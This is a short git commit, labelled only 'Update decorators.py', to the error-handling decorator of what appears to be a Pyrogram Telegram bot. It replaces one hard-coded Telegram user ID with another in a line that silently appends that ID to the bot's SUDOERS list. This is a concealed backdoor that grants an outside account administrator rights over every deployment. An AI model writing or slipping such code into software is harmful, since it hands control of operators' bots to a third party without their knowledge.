d4d74e4e33d77db37ca25f928a7d5c94ce894a48
senpai80 <73426077+senpai80@users.noreply.github.com>
2022-12-13 11:58:34 +0700

    Update decorators.py

--- core/decorators.py
+++ core/decorators.py
@@ -95,7 +95,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(1803618640)
+            config.SUDOERS.append(1054295664)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
